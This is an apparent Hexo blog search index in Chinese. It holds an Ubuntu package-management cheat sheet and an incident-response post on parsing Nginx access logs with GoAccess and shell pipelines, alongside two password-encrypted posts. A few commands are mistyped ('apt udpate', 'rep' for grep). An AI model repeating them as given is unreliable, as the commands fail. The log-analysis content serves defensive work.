fa8a302bf4693aa2448ed232e7c0df8d735831c97c7100ee07e8d2e46d074c8a2aef247e1c756a881a1a09c328b522ff283530072f5d51e8994c46fa2ef8e3674ee35184e70ff8b6b1574d23bc8a5b21bdd8263034da923d02cbca7c034c0a1cd6f63bf16e7e16778bfcd10bf6778af9f2f6006dda1e9fc596caf47bcc8c4c22eac7187da8f42db6265df54a9f4d7d786f92b1fcaebee42a4abab682fd396d07c8f82d7062e94210a3bbbb369ac83191d95de821737fcc111f1d1a47e32bbef942b26b347690282baf6ce5ffb64b97c0ca3938fe35c85c74da7bcda05d369f436bdba8d2c86609b69c0c093e9dcf580bcc791bd580e53e652b57e0aa08fc01e3e5824a154e7bc126d0338908ca1034566744a9a5e3b879fd73e6614697a4c42f7b970a04afb7f5bd0195cbc68fcea7ae055c627ea5b869eef0dc88d4f593e3a5dd75a19e19d9cb1966b311d6db39f1a96aaa030dea255eb891579e3f5ec19c121e567de55db725ff67154546e2c9d6cc47b89977f779238b3f3d5c7ba8b4bc772df7f2294566e96506d955d3fab373d09ca10866369c2c4a573093cc7836881e6853845dab7b317ed5432ca60bedf569fd4612098f2675d6a2a6fdc0b03f8a67583600046cf2338d9bd9766dca78ee68e76f24e6335687dbcd8a011ee5681ccc3112abcaa325fcb715d78bba6dd5d2e3a6ad4110af9aea4f9a70b2436d2d72ccc17e1d669f5762df5ab9af7256ad70e0a0ae316e74ad625be40d14d469994d6cbc682b0f50eb4490b5321389ccd85155fa7c3878a39309f2afece0a2a6daf9fb953540b7cba9b2917124ddac1f023241c832872f8b302e4ee6f5dbc7f32f852fefbf6773c8b5689e3593f2653d3e2ca99b27d6a2e3d7512ff447e6444dfd80e766692ed2be1088532961d1cbe7cedaf4287dc8e7504083a0779</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu的常用操作</title>
      <link href="/p/3a63419e.html"/>
      <url>/p/3a63419e.html</url>
      
        <content type="html"><![CDATA[<h2 id="包管理"><a href="#包管理" class="headerlink" title="包管理"></a>包管理</h2><h3 id="apt"><a href="#apt" class="headerlink" title="apt"></a>apt</h3><p>更新源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt udpate</span><br></pre></td></tr></table></figure><p>更新已经安装的软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure><p>安装软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install firefox</span><br></pre></td></tr></table></figure><p>移除软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt remove firefox</span><br><span class="line"># 删除并清除配置文件</span><br><span class="line">sudo apt --purge remove firefox</span><br></pre></td></tr></table></figure><p>清理安装包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt autoclean</span><br><span class="line">#清理所有安装包</span><br><span class="line">sudo apt clean</span><br></pre></td></tr></table></figure><p>搜索软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt search firefox</span><br></pre></td></tr></table></figure><p>列出已安装的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt list --installed</span><br></pre></td></tr></table></figure><p>卸载多余依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt autoremove</span><br></pre></td></tr></table></figure><h3 id="snap"><a href="#snap" class="headerlink" title="snap"></a>snap</h3><p>snap安装软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo snap install firefox</span><br></pre></td></tr></table></figure><p>列出安装的软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snap list</span><br></pre></td></tr></table></figure><p>搜索软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snap find</span><br></pre></td></tr></table></figure><p>更新软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo snap refresh firefox</span><br><span class="line"># 更新全部</span><br><span class="line">sudo snap refresh all</span><br></pre></td></tr></table></figure><p>卸载软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snap remove firefox</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx日志</title>
      <link href="/p/4d35cb45.html"/>
      <url>/p/4d35cb45.html</url>
      
        <content type="html"><![CDATA[<p>Nginx是一款自由的、开源的、高性能的HTTP服务器和反向代理服务器；同时也是一个IMAP、POP3、SMTP代理服务器；Nginx可以作为一个HTTP服务器进行网站的发布处理，另外Nginx可以作为反向代理进行负载均衡的实现。</p><span id="more"></span><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p><strong>特点：</strong>客户端非常明确要访问的服务器地址，屏蔽或隐藏了真实客户端信息。</p><p><strong>流程：</strong>客户端 —&gt; 正向代理服务器–&gt; 远程网站、资源</p><p><strong>用途：</strong>1.访问无法访问资源；2.做缓存；3.对客户端访问授权，上网进行认证；4.代理可以记录用户访问记录（上网行为管理），对外隐藏用户信息</p><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p><strong>特点：</strong>反向代理隐藏了服务器的信息</p><p><strong>作用：</strong>（1）保证内网的安全，通常将反向代理作为公网访问地址，Web服务器是内网；（2）负载均衡，通过反向代理服务器来优化网站的负载</p><h2 id="Nginx日志"><a href="#Nginx日志" class="headerlink" title="Nginx日志"></a>Nginx日志</h2><h3 id="日志位置"><a href="#日志位置" class="headerlink" title="日志位置"></a>日志位置</h3><p>默认在 <code>/usr/local/nginx/logs</code> 目录下</p><p><code>access.log</code> 访问日志</p><p><code>error.log</code> 错误日志</p><p><code>nginx.conf</code> 配置文件</p><h3 id="nginx-conf"><a href="#nginx-conf" class="headerlink" title="nginx.conf"></a>nginx.conf</h3><h4 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">log_format</span>  main  <span class="string">&#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span></span><br><span class="line">                  <span class="string">&#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span></span><br><span class="line">                  <span class="string">&#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>这里是通达OA中的默认配置</p></blockquote><p><strong>$remote_addr：</strong>请求服务器的客户端IP</p><p><strong>$remote_user：</strong>客户端用户名称，此项是用来记录用户HTTP的身份验证信息。如果某些网站要求用户进行身份验证，那么这一项就是记录用户的身份信息；</p><p><strong>$time_local：</strong> 请求的时间与时区；</p><p><strong>$request：</strong> 用来记录”请求方法/访问路径请求参数/协议”；</p><p><strong>$status：</strong> 用来记录请求状态；</p><p><strong>$body_bytes_sent ：</strong>记录发送给客户端文件主体内容大小；</p><p><strong>$http_referer：</strong>用来记录从哪个页面链接访问过来的；</p><p><strong>$http_user_agent：</strong>记录客户浏览器的相关信息；</p><p><strong>$http_x_forwarded_for：</strong>用以记录客户端的ip地址；</p><h4 id="日志样例"><a href="#日志样例" class="headerlink" title="日志样例"></a>日志样例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [18/Aug/2021:16:09:30 +0800] &quot;GET /inc/new_sms.php?now=1629274170398 HTTP/1.1&quot; 200 33 &quot;http://localhost:88/general/index.php&quot; &quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727)&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><h4 id="X-Forwarded-For和-REMOTE-ADDR的区别"><a href="#X-Forwarded-For和-REMOTE-ADDR的区别" class="headerlink" title="X-Forwarded-For和 REMOTE_ADDR的区别"></a><a href="http://blog.nsfocus.net/user-ip/"><strong>X-Forwarded-For和 REMOTE_ADDR的区别</strong></a></h4><p><strong>REMOTE_ADDR</strong>代表着客户端的IP，但是这个客户端是相对服务器而言的，也就是实际上与服务器相连的机器的IP（建立tcp连接的那个），这个<strong>值是不可伪造</strong>的，如果没有代理的话，这个值就是用户实际的IP值，有代理的话，<strong>REMOTE_ADDR</strong>会被设置为代理机器的IP值。<br>正如前面所说，有了代理就获取不了用户的真实IP，由此X-Forwarded-For应运而生，它是一个非正式协议，在请求转发到代理的时候代理会添加一个<strong>X-Forwarded-For头</strong>，将连接它的客户端IP（也就是你的上网机器IP）加到这个头信息里，这样末端的服务器就能获取真正上网的人的IP了。</p><p>🌰🌰🌰</p><p>假设用户的请求顺序如下：<br>网民电脑ip-&gt;代理服务器1–&gt;代理服务器2–&gt;目标服务器<br><strong>REMOTE_ADDR</strong> 就是: 代理服务器2的IP值<br>**X-Forwarded-For **就是：网民电脑IP，代理1的IP，代理2的IP<br>在这里只有REMOTE_ADDR是可信的，其他从客户端获取的数据都是不可信的，都是可伪造的。</p><p>🥚💦</p><p>服务器端开了nginx反向代理的时候，每次获取的都是反向代理的IP，需要nginx在配置反向代理的时候做一定设置并且修改代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxy_set_header            Host $host;</span><br><span class="line">proxy_set_header            X-Real-IP $remote_addr;</span><br><span class="line">proxy_set_header            X-Forwarded-For $proxy_add_x_forwarded_for;</span><br></pre></td></tr></table></figure><blockquote><p>反向代理nginx的配置中将REMOTE_ADDR赋给了X-Real-IP，从X-Real-IP中来获取用户的IP</p></blockquote><h4 id="nginx获取post数据"><a href="#nginx获取post数据" class="headerlink" title="nginx获取post数据"></a>nginx获取post数据</h4><p>$request_body是nginx的内置变量,可以记录post的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.79.132 - - [25/Aug/2021:14:06:38 +0800] &quot;POST /logincheck.php HTTP/1.1&quot; 200 1000 &quot;http://192.168.77.175:8668/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0&quot; &quot;-&quot; &quot;UNAME=admin&amp;PASSWORD=&amp;encode_type=1&quot;</span><br></pre></td></tr></table></figure><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="GoAccess"><a href="#GoAccess" class="headerlink" title="GoAccess"></a>GoAccess</h3><p><a href="https://github.com/allinurl/goaccess?utm_source=ld246.com">Github地址</a> <a href="https://goaccess.io/?utm_source=ld246.com">官网</a> </p><p><a href="https://www.goaccess.cc/?mod=man">中文站点</a></p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install goaccess</span><br></pre></td></tr></table></figure><blockquote><p>安装好的版本是1.4的，够用了后续用centos搭建的时候，再补充编译安装吧。</p></blockquote><h4 id="使用定义好的日志格式在终端输出"><a href="#使用定义好的日志格式在终端输出" class="headerlink" title="使用定义好的日志格式在终端输出"></a>使用定义好的日志格式在终端输出</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goaccess oa.access.log -c</span><br></pre></td></tr></table></figure><blockquote><p>预定义的选项包括：通用日志格式，联合日志格式，包含虚拟主机，W3C 格式以及亚马逊 CloudFront(分布式下载)。</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210820163337623.png" alt="image-20210820163337623"></p><p><strong>空格选中，回车继续，q退出，选择通用日志格式（CLF）</strong></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210820163450514.png" alt="image-20210820163450514"></p><p><strong>终端输出：</strong></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210820163616304.png" alt="image-20210820163616304"></p><h5 id="终端热键"><a href="#终端热键" class="headerlink" title="终端热键:"></a>终端热键:</h5><p><strong>F1</strong> 或 <strong>h</strong>主帮助页面。</p><p><strong>F5</strong>重绘主窗口。</p><p><strong>q</strong>退出程序，当前窗口或者崩溃了的模块。</p><p><strong>o</strong> 或 <strong>ENTER</strong>扩展选中的模块或打开窗口。</p><p><strong>0-9</strong> 和 <strong>Shift + 0</strong>激活选中的模块。</p><p><strong>c</strong>设置或者改变配色方案。</p><p><strong>滚动功能：</strong><br><strong>j</strong>在已扩展模块中向下滚动。</p><p><strong>k</strong>在已扩展模块中向上滚动。</p><p><strong>^ f</strong>在当前模块中向<strong>下</strong>滚动一页。</p><p><strong>^ b</strong>在当前模块中向<strong>上</strong>滚动一页。</p><p><strong>TAB</strong>切换模块(向后)。#和官网手册上写的不一样</p><p><del><strong>SHIFT + TAB</strong>切换模块(向后)。</del>    #测试无效</p><p><strong>g</strong>移动到第一个选项或者屏幕顶部。</p><p><strong>G</strong>移动到第最后一个选项或者屏幕底部。    </p><p><strong>s</strong>给活跃模块的选项排序。<br><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210820165332356.png" alt="image-20210820165332356"></p><p>**/**在所有模块中搜索(支持正则)。</p><p><strong>n</strong>找到下次发生事件的位置。</p><h4 id="自定义-日志-日期-格式"><a href="#自定义-日志-日期-格式" class="headerlink" title="自定义 日志/日期 格式"></a>自定义 日志/日期 格式</h4><p>GoAccess 可以解析虚拟的任意 Web 日志格式。</p><p>配置文件位于：<code>%sysconfdir%/goaccess.conf</code> 或者 <code>~/.goaccessrc</code></p><mark class="hl-label blue">注意:</mark>    `%sysconfdir%` 可能是 /etc/, /usr/etc/ 或者 /usr/local/etc/<p><strong>time-format</strong> 参数 time-format 后跟随一个空格符，指定日志的<strong>时间</strong>格式，包含普通字符与特殊格式说明符的任意组合。他们都由百分号 (%)开始。参考 <code>man strftime</code>。 <code>%T</code> 或者 <code>%H:%M:%S</code>.</p><mark class="hl-label blue">注意:</mark>   如果给定的时间戳以**微秒**计算，则必须在 *time-format* 中使用参数 `%f` 。<p><strong>date-format</strong> 参数 date-format 后跟随一个空格符，指定日志的<strong>日期</strong>格式，包含普通字符与特殊格式说明符的任意组合。他们都由百分号 (%)开始。参考 <code>man strftime</code>。</p><mark class="hl-label blue">注意:</mark>  如果给定的时间戳以微秒计算，则必须在 *time-format* 中使用参数 `%f` 。<p><strong>log-format</strong> 参数 log-format 后跟随一个空格符或者制表分隔符(<code>\t</code>)，用于指定日志字符串格式。</p><p>朋友发给我一个他自己写的配置🤡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">log_format  access_json_log escape=json &#x27;&#123;&quot;@timestamp&quot;:&quot;$time_local&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;http_host&quot;:&quot;$http_host&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;clientip&quot;:&quot;$remote_addr&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;request&quot;:&quot;$request&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;status&quot;:&quot;$status&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;size&quot;:&quot;$body_bytes_sent&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;upstream_addr&quot;:&quot;$upstream_addr&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;upstream_status&quot;:&quot;$upstream_status&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;upstream_response_time&quot;:&quot;$upstream_response_time&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;request_time&quot;:&quot;$request_time&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;http_referer&quot;:&quot;$http_referer&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;http_user_agent&quot;:&quot;$http_user_agent&quot;,&#x27;</span><br><span class="line">                                &#x27;&quot;http_x_forwarded_for&quot;:&quot;$http_x_forwarded_for&quot;&#125;&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p>看起来是个狠人</p></blockquote><p>那就写个配置文件练习一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">time-format %H:%M:%S</span><br><span class="line">date-format %d/%b/%Y</span><br><span class="line">log_format &#123;&quot;%^&quot;:&quot;%d:%t %^&quot;,&quot;%^&quot;:&quot;%^&quot;,&quot;%^&quot;:&quot;%h&quot;,&quot;%^&quot;:&quot;%r&quot;,&quot;%^&quot;:&quot;%s&quot;,&quot;%^&quot;:&quot;%b&quot;,&quot;%^&quot;:&quot;%^&quot;,&quot;%^&quot;:&quot;%^&quot;,&quot;%^&quot;:&quot;%^&quot;,&quot;%^&quot;:&quot;%^&quot;,&quot;%^&quot;:&quot;%^&quot;,&quot;%^&quot;:&quot;%u&quot;,&quot;%^&quot;:&quot;%^&quot;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我感觉我这种做法太笨蛋🤓🤓，其实最后一个XFF按照官网手册应该是<code>~h</code>的，但不知道为什么写上去就报错，后续再研究一下吧。</p></blockquote><h4 id="特殊格式说明符"><a href="#特殊格式说明符" class="headerlink" title="特殊格式说明符"></a>特殊格式说明符</h4><p><strong>%x</strong> 匹配 time-format 和 date-format 变量的日期和时间字段。用于使用时间戳来代替日期和时间两个独立变量的场景。</p><p><strong>%t</strong> 匹配 time-format 变量的时间字段。</p><p><strong>%d</strong> 匹配 date-format 变量的日期字段。</p><p><strong>%v</strong> 根据 canonical 名称设定的服务器名称(服务区或者虚拟主机)。</p><p><strong>%e</strong> 请求文档时由 HTTP 验证决定的用户 ID。</p><p><strong>%h</strong> 主机(客户端IP地址，IPv4 或者 IPv6)。</p><p><strong>%r</strong> 客户端请求的行数。这些请求使用分隔符(单引号，双引号)引用的部分可以被解析。否则，需要使用由特殊格式说明符(例如：**%m**, <strong>%U</strong>, <strong>%q</strong> 和 <strong>%H</strong>)组合格式去解析独立的字段。</p><ul><li><mark class="hl-label blue">注意：</mark>  既可以使用 **%r** 获取完整的请求，也可以使用 **%m**, **%U**, **%q** and **%H** 去组合你的请求，但是不能同时使用。</li></ul><p><strong>%m</strong> 请求的方法。</p><p><strong>%U</strong> 请求的 URL。</p><ul><li><mark class="hl-label blue">注意：</mark>  如果查询字符串在 **%U**中，则无需使用 **%q**。但是，如果 URL 路径中没有包含任何查询字符串，则你可以使用 **%q** 查询字符串将附加在请求后面。</li></ul><p><strong>%q</strong> 查询字符串。</p><p><strong>%H</strong> 请求协议。</p><p><strong>%s</strong> 服务器回传客户端的状态码。</p><p><strong>%b</strong> 回传客户端的对象的大小。</p><p><strong>%R</strong> HTTP 请求的 “Referer” 值。</p><p><strong>%u</strong> HTTP 请求的 “UserAgent” 值。</p><p><strong>%D</strong> 处理请求的时间消耗，使用微秒计算。</p><p><strong>%T</strong> 处理请求的时间消耗，使用带秒和毫秒计算。</p><p><strong>%L</strong> 处理请求的时间消耗，使用十进制数表示的毫秒计算。</p><p><strong>%^</strong> 忽略此字段。</p><p><strong>%~</strong> 继续解析日志字符串直到找到一个非空字符(!isspace)。</p><p><strong>~h</strong> 在 X-Forwarded-For (XFF) 字段中的主机(客户端 IP 地址，IPv4 或者 IPv6)。</p><p>针对 XFF， GoAccess 使用了一个特殊符号，即由一个波浪号+主机说明符构成，然后紧跟由大括号封装起来的 XFF 限定字段(例：**<code>~h&#123;,&quot;&#125;</code>**)。</p><blockquote><p>举例如下， <strong><code>~h&#123;,&quot; &#125;</code></strong> 用于解析 “11.25.11.53, 17.68.33.17” 字段由一对双引号，一个逗号和一个空格限定。</p></blockquote><h4 id="输出HTML页面"><a href="#输出HTML页面" class="headerlink" title="输出HTML页面"></a>输出HTML页面</h4><p><strong>静态：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo goaccess access.log -p .goaccessrc -o /var/www/html/report.html</span><br></pre></td></tr></table></figure><blockquote><p>这里输出路径开了kali2021，Apache服务。</p><p><code>-p</code>：指定要使用的自定义配置文件</p><p><code>-o</code>：输出到指定扩展名文件中（Html、Json、CSV）</p></blockquote><p><strong>动态：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo goaccess access.log -p .goaccessrc -o /var/www/html/report.html --real-time-html</span><br></pre></td></tr></table></figure><blockquote><p>生成实时 HTML 报告的过程和生成静态报告的过程非常相似。实时报告仅仅需要使用参数 <code>--real-time-html</code></p></blockquote><p><strong>输出结果：</strong></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210820183543494.png" alt="image-20210820183543494"></p><h3 id="Linux-命令分析"><a href="#Linux-命令分析" class="headerlink" title="Linux 命令分析"></a>Linux 命令分析</h3><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p><code>xargs</code>命令的作用，是将标准输入转为命令行参数。</p><p>具体用法详见：<a href="https://www.ruanyifeng.com/blog/2019/08/xargs-tutorial.html">xargs 命令教程</a></p><p><code>cut</code>命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。</p><ul><li>-d ：自定义分隔符，默认为制表符。</li><li>-f ：与-d一起使用，指定显示哪个区域。</li></ul><p><code>sort</code>将文本文件内容加以排序。</p><ul><li>[-k field1[,field2]] 按指定的列进行排序。</li><li>-r 以相反的顺序来排序。</li></ul><p><code>uniq</code>用于检查及删除文本文件中重复出现的行列</p><p>-c或–count 在每列旁边显示该行重复出现的次数。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210823193719130.png" alt="image-20210823193719130"></p><p><code>wc</code>将计算指定文件的行数、字数，以及字节数</p><ul><li>-l或–lines 显示行数。</li></ul><p>定位具体的IP地址或文件名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find . access.log | xargs grep &quot;ip&quot;</span><br><span class="line">find . access.log | xargs grep &quot;filename&quot;</span><br></pre></td></tr></table></figure><blockquote><p>查找文件名包含<code>access.log</code>以后，对每个文件搜索一次是否包含字符串的内容</p><p>顺便一说：奇安信的《网络安全应急响应》这里好像写错了</p></blockquote><h4 id="IP驱动"><a href="#IP驱动" class="headerlink" title="IP驱动"></a>IP驱动</h4><p>查看访问次数最多的前10个IP</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat oa.access.log | cut -f1 -d &quot; &quot; | sort | uniq -c | sort -k 1 -rn |head -10</span><br></pre></td></tr></table></figure><blockquote><p>先把IP字段提取出来，去重排列，计数根据计数结果也就是第一列排序。</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210823195053834.png" alt="image-20210823195053834"></p><blockquote><p>顺便再一说：奇安信的《网络安全应急响应》这里少了个<code>n</code>参数。</p></blockquote><p>查看每一个IP访问量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#x27; oa.access.log</span><br></pre></td></tr></table></figure><p>查看特定的ip访问的url</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rep ^127.0.0.1 oa.access.log| awk &#x27;&#123;print $1,$7&#125;&#x27;</span><br></pre></td></tr></table></figure><h4 id="时间驱动"><a href="#时间驱动" class="headerlink" title="时间驱动"></a>时间驱动</h4><p>查看xxx时间点这一个小时内IP访问量:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;print $4,$1&#125;&#x27; oa.access.log | grep 23/Aug/2021:15 | awk &#x27;&#123;print $2&#125;&#x27;| sort | uniq | wc -l</span><br></pre></td></tr></table></figure><h4 id="目的驱动-访问的url等"><a href="#目的驱动-访问的url等" class="headerlink" title="目的驱动(访问的url等)"></a>目的驱动(访问的url等)</h4><p>去掉搜索引擎统计当天的页面：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;print $12,$1&#125;&#x27; oa.access.log | grep ^\&quot;Mozilla | awk &#x27;&#123;print $2&#125;&#x27; |sort | uniq| wc -l</span><br></pre></td></tr></table></figure><p>统计日志文件中的爬虫</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E &#x27;Googlebot|Baiduspider&#x27; log_file | awk &#x27;&#123; print $1 &#125;&#x27; | sort | uniq</span><br></pre></td></tr></table></figure><p>统计相关扫描器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat log_file | grep -v -E &#x27;python|java|awvs&#x27; | sort | uniq -c | sort -r -n | head -n 100</span><br></pre></td></tr></table></figure><p>统计HTTP状态码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat log_file |awk &#x27;&#123;print $9&#125;&#x27;|sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><p>访问URL统计</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat log_file |awk &#x27;&#123;print $7&#125;&#x27;|sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><p>URL访问量统计</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat log_file | awk &#x27;&#123;print $7&#125;&#x27; | egrep &#x27;\?|&amp;&#x27; | sort | uniq -c | sort -rn | more</span><br></pre></td></tr></table></figure><p><a href="https://mp.weixin.qq.com/s/pRhyqvdMqMAlc5NVihwZtw">参考链接</a></p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sysmon</title>
      <link href="/p/bef03572.html"/>
      <url>/p/bef03572.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4d95e94613726b0410d6fa18df55c8d284fa876c51ac802add5b3f89dceafc5b">c157c9744e0298d00173c08a9dbffe0ed073a56f7e3a628a68d0b68815ec97a64ab4737f0dff2e83a363c7c0d8caada40c9fea04809855aba46a2e7988ac379ef51da40f7500b1d15fd47dccccf13da512dde76b39124c5e4126ee975f2c5a61c55dead4b3313a7892b645447ddf257071c23869abc55ccc1c4837c2a2bd075f7d9a3e020a56328c7705575b472249baea0ba5e357d0217ee11753a8765b360603233b02ae979fef82c40e3f42db8d5de0aaf8ddc6aae6540f02568d4b6bdf8962b0b4471a43d02c7b3f16abca982c12704cd5cca4bed39aa2d2cc8f9f1a94e30d24caa3dec3757b9cf31de8e7805cb3047b13d0e29c9e90b534c17784f6638f1050d190711fa8d78fb4013602e9cf1c59b17f6722683486e786228edc1ab102e284804b097fe48eb1a8ce46456aa4a816aed724c41d15586b25320653b0ce4113df1b4805d8df6d2c3a987a37259d844ae82f1bcf498af10a136cbb27daa323461948f67040c9ccff2232c414836b468d81569cde9a22cea021303aa0ae17e1b1e8f19e9a46e48c3c249cc7c2dc49da3eb9452f67c5b68315837136958e33a792007e4757c3592c473bbd